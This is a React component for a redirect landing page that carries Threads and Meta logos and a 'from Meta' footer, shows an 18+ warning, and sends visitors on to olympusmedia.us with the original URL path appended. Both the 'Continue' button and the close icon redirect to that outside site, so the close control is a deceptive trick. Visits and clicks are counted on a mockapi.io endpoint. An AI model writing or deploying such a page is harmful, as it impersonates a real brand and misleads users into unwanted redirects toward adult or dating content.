import { useEffect } from 'react';
import './App.css';


function App() {
  const location = window.location.href;
  const url = location.replace('https://redirect-dating.vercel.app/', '')
  const re = `https://olympusmedia.us/${url}`



  const getCount = async (key) => {
    fetch('https://66e15506c831c8811b548c9a.mockapi.io/traffic', { method: 'GET' })
      .then(res => res.json())
      .then(data => {
        let count = data[0]?.[key];
        if (!count) {
          return;
        }

        count += 1;
        fetch('https://66e15506c831c8811b548c9a.mockapi.io/traffic/1', {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            [key]: count
          })
        })
      });
  }

  const onClickClose = async () => {
    try {
      await getCount('total_click_close');
      window.location.href = re;
    } catch (error) {
      window.location.href = re;
    }
  }

  const onClickContinue = async () => {
    try {
      await getCount('total_click_continue');
      window.location.href = re;
    } catch (error) {
      window.location.href = re;
    }
  }

  useEffect(() => {
    getCount('count');
  }, [])

  return (
    <div className="App">
      <img
        src='/close.png'
        alt="close"
        style={{
          position: 'fixed',
          top: '20px',
          right: '20px',
          width: '20px',
          height: '20px',
          cursor: 'pointer'
        }}
        onClick={onClickClose}
      />
      <div
        style={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          height: '100vh',
          width: '100%',
          backgroundColor: 'black',
          color: 'white',
          fontSize: '20px'
        }}
      >
        <img
          src='/threads.png'
          alt='threads'
          style={{
            width: '100px',
            height: '100px',
            marginBottom: '20px'
          }}
        />
        <p
          style={{
            fontSize: '30px',
            maxWidth: '800px',
            marginTop: '100px',
          }}
        >Warning: Content is for individuals aged 18 and over. Click "Continue" if you are 18 or older!
        </p>

        <button
          style={{ padding: '20px 40px', fontSize: '20px', cursor: 'pointer', borderRadius: '40px' }}
          onClick={onClickContinue}
        >Click here to continue</button>

        <div style={{
          marginTop: '100px',
          color: 'gray',
        }}>
          <p>from</p>
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '16px'
            }}
          >
            <img
              src='/meta.png'
              alt='meta'
              style={{
                width: '40px',
                height: '30px',
              }}
            />
            <p
              style={{
                margin: 0,
                fontSize: '30px',
                fontWeight: 'medium'
              }}
            >Meta</p>
          </div>
        </div>
      </div>
    </div>
  );
}

export default App;
